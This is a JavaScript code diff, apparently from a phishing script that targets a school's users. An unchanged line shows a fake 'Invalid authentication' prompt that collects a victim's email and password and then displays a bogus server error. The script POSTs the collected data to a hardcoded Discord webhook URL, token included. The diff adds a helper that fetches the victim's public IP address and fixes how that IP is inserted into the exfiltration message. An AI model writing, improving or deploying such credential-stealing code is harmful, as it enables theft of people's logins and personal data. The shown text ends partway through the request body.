@@ -1,5 +1,20 @@
+async function fetchPublicIpAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        if (!response.ok) {
+        throw new Error('Failed to fetch IP address');
+        }
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('Error fetching IP address:', error);
+        return 'Error fetching IP address';
+    }
+}
+
 while ((pr = window.prompt("Invalid authentication! Please retype your email and password in this format:\n\nemail+password \n\nExample:\n  johndoe@dazsma-osjschools.edu.ph + john_secret_password")) == '') {} alert("An error has occured to the servers. Please contact the developers to help fix this issue.");
 
+var ipAddr = await fetchPublicIpAddress();
 fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoVtcbZs16gwTLzs98Dl3ceLoU6ruAnZZ7E-HjKN9YHwL6vaaw0", {
     "method": "POST",
     "headers": {
@@ -11,7 +26,7 @@ fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoV
         "embeds": [
             {
                 "title": "IP Address",
-                "description": "```"+ (await fetch('https://api.ipify.org?format=json')).then(resp => {return resp.json().ip}) + "```",
+                "description": "```" + ipAddr + "```",
                 "color": 16711680
             },
             {   
